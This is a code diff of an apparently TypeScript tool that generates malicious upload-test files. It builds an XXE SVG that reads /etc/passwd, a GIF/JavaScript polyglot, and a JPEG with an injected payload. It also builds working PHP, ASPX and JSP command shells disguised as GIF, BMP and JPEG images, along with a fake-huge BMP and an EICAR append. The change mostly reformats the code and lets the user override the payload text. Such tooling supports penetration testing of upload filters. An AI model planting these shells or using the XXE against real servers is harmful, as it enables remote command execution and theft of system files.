@@ -61,7 +61,7 @@ export const generateCanvasImage = async (settings: GenerationSettings): Promise
     canvas.width = settings.width;
     canvas.height = settings.height;
     const ctx = canvas.getContext('2d');
-    
+
     if (!ctx) {
       reject(new Error("Could not get canvas context"));
       return;
@@ -74,7 +74,7 @@ export const generateCanvasImage = async (settings: GenerationSettings): Promise
     // Text
     if (settings.text) {
       ctx.fillStyle = parseInt(settings.color.replace('#', ''), 16) > 0xffffff / 2 ? '#000000' : '#ffffff';
-      
+
       const fontSize = Math.max(12, Math.floor(settings.width / 10));
       ctx.font = `bold ${fontSize}px sans-serif`;
       ctx.textAlign = 'center';
@@ -84,7 +84,7 @@ export const generateCanvasImage = async (settings: GenerationSettings): Promise
 
     if (settings.format === ImageFormat.BMP) {
       const bmpData = createBMP(settings.width, settings.height, settings.color);
-      resolve(new Blob([bmpData], { type: 'image/bmp' }));
+      resolve(new Blob([bmpData.buffer as ArrayBuffer], { type: 'image/bmp' }));
     } else {
       canvas.toBlob((blob) => {
         if (blob) resolve(blob);
@@ -118,7 +118,7 @@ ${baseSvgStart}
   ${rect}${text}
 </svg>`;
       break;
-    
+
     case 'XXE_BASIC':
       content = `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [ <!ELEMENT svg ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>${baseSvgStart}${rect}<text x="50%" y="50%" fill="red" font-size="20">&xxe;</text></svg>`;
       break;
@@ -155,36 +155,36 @@ ${baseSvgStart}
 
 // Generates a JPEG with an injected Comment (COM) segment containing a payload
 export const generateJpegWithMetadata = async (settings: GenerationSettings, payload: string): Promise<Blob> => {
-    // 1. Generate valid JPEG
-    const originalBlob = await generateCanvasImage({ ...settings, format: ImageFormat.JPEG });
-    const buffer = await originalBlob.arrayBuffer();
-    const data = new Uint8Array(buffer);
+  // 1. Generate valid JPEG
+  const originalBlob = await generateCanvasImage({ ...settings, format: ImageFormat.JPEG });
+  const buffer = await originalBlob.arrayBuffer();
+  const data = new Uint8Array(buffer);
 
-    // 2. Locate SOI (FF D8) and Insert COM segment (FF FE)
-    const payloadBytes = new TextEncoder().encode(payload);
-    const length = payloadBytes.length + 2; 
-    const comSegment = new Uint8Array(4 + payloadBytes.length);
-    
-    comSegment[0] = 0xFF;
-    comSegment[1] = 0xFE;
-    comSegment[2] = (length >> 8) & 0xFF;
-    comSegment[3] = length & 0xFF;
-    comSegment.set(payloadBytes, 4);
+  // 2. Locate SOI (FF D8) and Insert COM segment (FF FE)
+  const payloadBytes = new TextEncoder().encode(payload);
+  const length = payloadBytes.length + 2;
+  const comSegment = new Uint8Array(4 + payloadBytes.length);
 
-    const newFile = new Uint8Array(data.length + comSegment.length);
-    newFile[0] = data[0]; 
-    newFile[1] = data[1]; 
-    newFile.set(comSegment, 2);
-    newFile.set(data.slice(2), 2 + comSegment.length);
+  comSegment[0] = 0xFF;
+  comSegment[1] = 0xFE;
+  comSegment[2] = (length >> 8) & 0xFF;
+  comSegment[3] = length & 0xFF;
+  comSegment.set(payloadBytes, 4);
 
-    return new Blob([newFile], { type: 'image/jpeg' });
+  const newFile = new Uint8Array(data.length + comSegment.length);
+  newFile[0] = data[0];
+  newFile[1] = data[1];
+  newFile.set(comSegment, 2);
+  newFile.set(data.slice(2), 2 + comSegment.length);
+
+  return new Blob([newFile], { type: 'image/jpeg' });
 };
 
 // Generates a GIF that is also valid JavaScript (Polyglot)
 export const generateGifPolyglot = (settings: GenerationSettings): Blob => {
   const payload = settings.text || "alert(1)";
   const jsPayload = `*/=1; ${payload};`;
-  
+
   const header = new Uint8Array([
     0x47, 0x49, 0x46, 0x38, 0x39, 0x61, // GIF89a
     0x2A, 0x2F, // Width: 0x2F2A (looks like /*)
@@ -192,33 +192,31 @@ export const generateGifPolyglot = (settings: GenerationSettings): Blob => {
     0xF7, 0x00, 0x00, // Global Color Table flags
     0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, // Black and white
   ]);
-  
+
   const blobParts = [header];
-  blobParts.push(new Uint8Array(256 * 3)); 
+  blobParts.push(new Uint8Array(256 * 3));
   blobParts.push(new TextEncoder().encode(jsPayload));
-  
+
   return new Blob(blobParts, { type: 'image/gif' });
 }
 
 // PHP Shell disguised as GIF
 export const generatePhpShellGif = (settings: GenerationSettings): Blob => {
-    const magic = new Uint8Array([0x47, 0x49, 0x46, 0x38, 0x39, 0x61]); // GIF89a
-    const shell = new TextEncoder().encode(`\n<?php system($_GET['c']); ?>\n`);
-    const junk = new Uint8Array(100).fill(0xCC); // Padding
-    
-    return new Blob([magic, junk, shell, junk], { type: 'image/gif' });
+  const magic = new Uint8Array([0x47, 0x49, 0x46, 0x38, 0x39, 0x61]); // GIF89a
+  const validShell = settings.text || `<?php system($_GET['c']); ?>`;
+  const shell = new TextEncoder().encode(`\n${validShell}\n`);
+  const junk = new Uint8Array(100).fill(0xCC); // Padding
+
+  return new Blob([magic, junk, shell, junk], { type: 'image/gif' });
 }
 
 // ASPX Shell disguised as BMP (Polyglot)
 export const generateAspxPolyglot = (settings: GenerationSettings): Blob => {
   // BMP Header with "BM" magic bytes
   // "BM" is 0x42 0x4D.
-  // ASPX ignores binary garbage before the <%@ %> directive often if configuration allows, 
-  // but a safer bet is a plain text file for ASPX. 
-  // However, for "Polyglot", let's make it valid BMP header first.
-  
-  const bmpHeader = createBMP(1, 1, '#000000').slice(0, 54); // Just the header
-  const payload = new TextEncoder().encode(`
+
+  const bmpHeader = createBMP(settings.width, settings.height, settings.color).slice(0, 54); // Just the header
+  const payloadText = settings.text || `
 <%@ Page Language="C#" %>
 <script runat="server">
     protected void Page_Load(object sender, EventArgs e)
@@ -230,7 +228,8 @@ export const generateAspxPolyglot = (settings: GenerationSettings): Blob => {
     }
 </script>
 <!-- Hex padding for visual spoofing -->
-`);
+`;
+  const payload = new TextEncoder().encode(payloadText);
 
   return new Blob([bmpHeader, payload], { type: 'image/bmp' });
 }
@@ -238,7 +237,7 @@ export const generateAspxPolyglot = (settings: GenerationSettings): Blob => {
 // JSP Shell disguised as JPEG (Polyglot-ish) or just raw
 export const generateJspPolyglot = (settings: GenerationSettings): Blob => {
   // Standard JSP Shell
-  const payload = `
+  const payloadText = settings.text || `
 <%@ page import="java.util.*,java.io.*"%>
 <%
 if (request.getParameter("cmd") != null) {
@@ -256,6 +255,7 @@ if (request.getParameter("cmd") != null) {
 %>
 <!-- Hidden in Image -->
 `;
+  const payload = new TextEncoder().encode(payloadText);
   return new Blob([payload], { type: 'application/x-jsp' });
 }
 
@@ -265,9 +265,9 @@ export const generateAnomaly = async (settings: GenerationSettings): Promise<Blo
   if (anomalyType === 'FAKE_HUGE') {
     const tinyBMP = createBMP(1, 1, color);
     const view = new DataView(tinyBMP.buffer);
-    view.setInt32(18, 50000, true); 
-    view.setInt32(22, 50000, true); 
-    return new Blob([tinyBMP], { type: 'image/bmp' });
+    view.setInt32(18, width > 10000 ? width : 50000, true);
+    view.setInt32(22, height > 10000 ? height : 50000, true);
+    return new Blob([tinyBMP.buffer as ArrayBuffer], { type: 'image/bmp' });
   }
 
   if (anomalyType === 'EICAR_APPEND') {
@@ -287,7 +287,7 @@ export const generateAnomaly = async (settings: GenerationSettings): Promise<Blo
   }
 
   if (anomalyType === 'GARBAGE_CONTENT') {
-    const size = 1024 * 5; 
+    const size = 1024 * 5;
     const buffer = new Uint8Array(size);
     crypto.getRandomValues(buffer);
     return new Blob([buffer], { type: 'application/octet-stream' });
